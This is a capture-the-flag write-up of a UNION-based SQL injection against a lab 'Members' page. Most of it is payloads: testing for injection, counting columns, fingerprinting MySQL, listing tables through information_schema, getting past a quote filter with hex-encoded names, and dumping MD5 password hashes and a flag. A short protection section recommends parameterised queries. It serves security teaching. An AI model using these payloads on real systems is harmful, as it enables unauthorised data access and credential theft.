SQL Injection - Members

1. Is the input vulnerable ?
	We can see that the input is vulnerable to SQL injection by submitting:
		Query: 1 or 1=1

2. What kind of query is done ?
	We can deduce that the query must look something like:
		SELECT `first name`, `surname` from `table name` where ID = [USER INPUT]

3. Exploitation method ?
	Knowing what the query looks like, we can assume it may be vulnerable to a UNION attack.
	We can confirm it by submitting:
		Query: 1 and 1=2 or union select test

4. Column number ?
	We can get how many columns is required for the injection by testing:
		Query: 1 and 1=2 or union select null
			=> "The used SELECT statements have a different number of columns"
		Query: 1 and 1=2 or union select null, null
			=> We get a result so the number of required columns is 2

5. DBMS ?
	We can determine which DBMS is used by submitting an request with an error in it:
		Query: 1 annd
			=> "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version..."

6. Table schema (Databases) + Table name
	We are on MySQL, so we can use the metadata in the information_schema to get the table schema and table names:
		Query: 1 and 1=2 union select table_schema, table_name from information_schema.tables
			=> We find interesting tables:
				Member_Brute_Force.db_default
				Member_Sql_Injection.users
				Member_guestbook.guestbook
				Member_images.list_images
				Memver_survey.vote_dbs

7. Column names
	We can use once again the information_schema to get columns names:
		We could get all columns for all tables names with the following query but it's not so classy:
			Query: 1 and 1=2 union select table_name, column_name from information_schema.columns
		1st attempt: 
			Submition is through query string so we cant use ' directly:
			Query: 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name = \'users\'
				=> Syntax error
			Query: 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name = %27users%27
				=> Syntax error
			Query: 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name = \\\\'users\\\\'
				=> Syntax error
			Query: 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name = %40%230039%3Busers%40%230039%3B
				=> Syntax error
			Query: 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name = %5C%27users%5C%27
				=> Syntax error
		2nd attempt:
			Looks like a string wont pass like this, there must be a filter, let's try with hex as MySQL converts it:
			db_default in hex is 0x64625f64656661756c74
			users in hex is 0x7573657273
			etc
			Query = 1 and 1=2 union select table_name, column_name from information_schema.columns where table_name=0x7573657273
				=> We get all the columns

8. Tables extraction:
	db_default:
		Query: 1 and 1=2 union select NULL, concat(id, username, password) from Member_Brute_Force.db_default
			=> 2 users: root and admin and md5 encrypted password:
				root: 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
				admin: 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
	users:
		Query: 1 and 1=2 union select NULL, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from Member_Sql_Injection.users
			=> We get 4 users, one being called Flag GetThe. It also gives instruction in other columns:
				Decrypt => lower => sha256
				5ff9d0165b4f92b14994e5c685cdce28 (crackstation => MD5) = FortyTwo => fortytwo => we hash it with sha256 and we get the flag


PROTECTION
	Sanitize properly user input from the back. Tons of lib can do this whatever language is used.
	Prepared statements with parametrized queries is is considered to be top 1 protection. This allows to distinguish between code and input so something like "1 and 1=2 etc." would be looked at directly in the database as the ID input.
